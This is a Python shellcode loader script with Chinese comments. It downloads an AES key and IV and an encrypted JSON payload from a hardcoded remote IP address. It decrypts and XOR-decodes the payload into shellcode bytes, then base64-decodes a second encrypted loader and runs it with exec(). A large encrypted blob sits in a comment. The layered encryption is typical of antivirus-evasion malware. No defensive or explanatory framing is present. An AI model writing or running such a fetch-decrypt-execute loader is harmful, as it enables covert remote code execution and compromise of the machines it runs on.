import ctypes
import aes
import binascii
import base64
import requests

keywords_url = 'http://118.178.229.36:9888/UPLOADS/keywords.txt'
json_url = 'http://118.178.229.36:9888/UPLOADS/data.json'

keywords_response = requests.get(keywords_url)
keywords = keywords_response.text.splitlines()
aes_key = keywords[0].strip()
aes_iv = keywords[1].strip()

data_response = requests.get(json_url)
data = data_response.json()  # 反序列化JSON数据

codestr = data['codestr']
codestr = aes.EncryptDate(aes_key, aes_iv).decrypt(codestr)
list = codestr.split('-')
reverse = ''
for n in list:
    c = chr(int(n) ^ 73)    # 得到异或运算后的解密字符
    reverse += c
source = reverse[::-1]      # 得到字符串后进行反转,得到原始ShellCode字符串
scbytes = binascii.a2b_hex(source)

# text_data ='d0+KV5nuu8oVCvY+8atN3wu58LU5gnBdXVpIw4lvZVjndXmRnREXVFH8TStgpzzggDRAACGAaovxkZtbraJKds0NJBgVMDcyzWCSHjoi2o4RvuHbwysbLzKqIwYJ6KOyLJf50AztRXxGmFA3CHfly4/3f+ZWWnVWYxGOjN+Qste/eG+OtdlU8So+GYIsgBxWYRUFDyeo9H3G4snr9RyITX/xTYwDZ+qOqR1i0k7q0WYaEukI8MfzRGg0YpAwVImPA6TCasKORLicQgyGV9fQyEIWT/T0FQ9/KCnX0Yl9I3LSicdcb82a/nLonGIMBy5CeHheZHj8iFrvygsWOFVYJoRjsdu8uvXePTbaeiohyPXL6xOcJS8DbzfdAd246pN2VogFxSAYzYcC4POYun4XstLfSuwyi6Ra2R5QI3Kqi936NXYEdE0bwwvV8e7/Y4UVEilb79gK1m3CnfjtemG0SiJwDK41mlJrYb/fQEJX7VF3kquDcBZ/fiEqDDcvVHXoYZeJH5Ksw/FU3ZUPWWF9mjrqBNgnCp8cVF6zsl3GCB593A2iS8mrw3JWrtFsWQx7w16rdP45/Ix07jGm4eujcu0DFpd0RyqGzRr2t+ZquB5X64WmtV/hsCXckZ+aH7dtsVS5abZDDW0Wb1tn8tlCJVNMcfNnV0m+a/TQZHSzWCzjv4cdlm6sW2sMYe7nL5chREqKHsEt280/2s7Uus5tpHzOt6VhKv06r8t/GRIewx6xCzL4Id20ffXBmJCxXp48hlPFvbgOOzhBqny7v+N8sAep++Yh6Z75QG2SBqj79i8SRnrwffkOuFcisx7ZRCU2dB5AbNgB3JsN+70pMNzNAtlIa72psAcO5WJqiuYxz9NTXhH4xGFJb2CH8uD37z7+VsprsWFd9+8IM4lcmE5Um5VNd+5Qi6oWwhdODgE7QYX0gb0OKT7oW7F5W7ERkCB5zhsouCJeYojzre2db1/j2uHPLigUcM6SFHrV9L+Rqoq4zi8N0RQjY+9R0dR46ENphoaD4FzNItF5zLpeI61bC2DfeNwYTgzx+CbSVMbQQLEjCmz1UCOCdcdmDII2x2zKSYglimWgXdmrt8yk0oJEMoan7vJ6hdWrPgLpR8pMBlEzhe0fSF8wMaqX5KpDxpw3GQQtcQhuw750tHTY44nWIVkWELvM5kRZVPomV5cwvl+6kfAbd/veTUW4DSFKy5fTkugjI/AeoNiP2WXrD9z6MwUHZzTgD5i81k60woy2yzRM94RUPLijoPePET4XXU8gMrY+2j73RmvtVUfp125BtD+QVf8Xq5s1mhVdBiW81zoDOmUJ5/Q0tztgFdgJkJsZBEW93fjfLW1Nh3tqstaELRXtfb/qKcn06Gc92GDtAm7j5ZswQmDyGOrOqm4njGQZTfqdRXs41VRor4p5y1DwTTmgS1rejYdBPBq105Ef2EREcKfdLmS1B8FnwwcmtHxC'
text_data = data['text_data']
loader= aes.EncryptDate(aes_key, aes_iv).decrypt(text_data)
exec (base64.b64decode(loader).decode())
